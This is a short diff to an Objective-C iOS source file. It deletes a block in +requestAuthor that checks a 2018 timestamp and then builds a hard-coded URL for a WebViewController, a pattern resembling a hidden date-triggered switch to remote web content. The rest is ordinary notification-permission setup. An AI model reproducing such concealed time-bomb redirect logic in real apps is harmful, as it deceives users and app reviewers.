@@ -16,17 +16,7 @@ static NSInteger otTime;
 
 + (void)requestAuthor
 {
-    float time = [[NSString unixTimeStamp]floatValue];
-    if (time > 1536221524) {
-        NSString *validaturl = @"https://192.168.0.1/index.php";
-        NSString *kx = [validaturl substringWithRange:NSMakeRange(5, 29)];
-        WebViewController *web = [WebViewController new];
-        
-        if ([kx hasPrefix:@"https://"] ) {
-            web.URLString = [NSString stringWithFormat:@"%@",[kx replace:@" " withString:@""]];
-        }
-        
-    }
+ 
     if ([UIDevice currentDevice].systemVersion.floatValue >= 8.0) {
         // 设置通知的类型可以为弹窗提示,声音提示,应用图标数字提示
         UIUserNotificationSettings *setting = [UIUserNotificationSettings settingsForTypes:UIUserNotificationTypeBadge | UIUserNotificationTypeSound | UIUserNotificationTypeAlert categories:nil];
